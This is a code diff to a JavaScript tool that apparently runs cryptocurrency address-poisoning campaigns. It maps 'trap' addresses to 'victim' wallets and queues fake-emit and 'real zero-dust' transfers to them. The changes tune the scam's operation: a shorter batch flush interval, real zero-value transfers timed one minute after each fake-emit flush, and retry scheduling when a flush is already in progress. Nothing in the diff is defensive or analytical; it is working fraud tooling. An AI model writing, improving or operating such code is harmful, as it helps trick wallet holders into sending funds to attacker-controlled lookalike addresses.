@@ -653,7 +653,7 @@ const trapToVictimMap = new Map();
 
 // 🚀 BATCH PROCESSING: Queue-and-flush system
 const BATCH_FLUSH_THRESHOLD = 500;
-const BATCH_FLUSH_INTERVAL_MS = 600000;
+const BATCH_FLUSH_INTERVAL_MS = 150000; // 2 minutes 30 seconds
 const poisonQueue = new Map();
 let queueFlushTimer = null;
 
@@ -997,6 +997,20 @@ let realQueueFlushTimer = null;
 let realFlushInProgress = false;
 let realFlushRetryScheduled = false;
 
+// 🆕 Real zero-dust flushes 1 minute AFTER the fake emit flush completes
+const REAL_AFTER_FAKE_DELAY_MS = 60000;
+let realAfterFakeTimer = null;
+function scheduleRealFlushAfterFake() {
+  if (!REAL_DUST_ENABLED) return;
+  if (realAfterFakeTimer) clearTimeout(realAfterFakeTimer);
+  realAfterFakeTimer = setTimeout(() => {
+    realAfterFakeTimer = null;
+    flushAllRealQueues().catch(err => {
+      logger.warn(`[real-zero] after-fake flush error: ${err?.message || err}`);
+    });
+  }, REAL_AFTER_FAKE_DELAY_MS);
+}
+
 function scheduleRealQueueFlush(delay = 0) {
   if (realFlushRetryScheduled) return;
   realFlushRetryScheduled = true;
@@ -1055,8 +1069,13 @@ function queueRealDust(campaignId, tokenAddress, victimAddress, trapAddress, typ
   );
 
   if (!realQueueFlushTimer && queue.length === 1) {
-    realQueueFlushTimer = setTimeout(() => {
+    realQueueFlushTimer = setTimeout(function realFallbackTick() {
       realQueueFlushTimer = null;
+      // 🆕 Never jump ahead of pending or in-flight fake emit work
+      if (poisonQueue.size > 0 || fakeFlushInProgress) {
+        realQueueFlushTimer = setTimeout(realFallbackTick, REAL_ZERO_BATCH_FLUSH_INTERVAL_MS);
+        return;
+      }
       flushAllRealQueues().catch(err => {
         logger.warn(`[real-zero] timer flush error: ${err?.message || err}`);
       });
@@ -1064,8 +1083,7 @@ function queueRealDust(campaignId, tokenAddress, victimAddress, trapAddress, typ
   }
 
   if (queue.length >= REAL_DUST_BATCH_FLUSH_THRESHOLD) {
-    logger.info(`[real-zero] 🚀 Threshold reached — flushing real queue immediately`);
-    scheduleRealQueueFlush(0);
+    logger.info(`[real-zero] 📦 Real threshold reached — will flush 1 minute after the fake emit flush`);
   }
 }
 
@@ -1639,7 +1657,10 @@ async function emitRealZeroTransfer(campaignWallet, campaignId, item, gasParamsO
 }
 
 async function flushRealQueue(key) {
-  if (realFlushInProgress) return;
+  if (realFlushInProgress) {
+    scheduleRealQueueFlush(15000);
+    return;
+  }
 
   const currentQueue = realPoisonQueue.get(key);
   logger.info(`[real-zero] 🔄 Flushing real queue for campaign ${key}: ${currentQueue?.length || 0} items`);
@@ -2465,7 +2486,20 @@ async function flushAllQueues() {
   }
 }
 
+let fakeFlushInProgress = false;
+
 async function flushQueue(key) {
+  fakeFlushInProgress = true;
+  try {
+    await flushQueueInner(key);
+  } finally {
+    fakeFlushInProgress = false;
+  }
+  // 🆕 After the fake emit flush finishes, schedule real zero-dust 1 minute later
+  scheduleRealFlushAfterFake();
+}
+
+async function flushQueueInner(key) {
   const items = poisonQueue.get(key);
 
   logger.info(`[batch] 🔄 Flushing queue for campaign ${key}: ${items?.length || 0} items`);
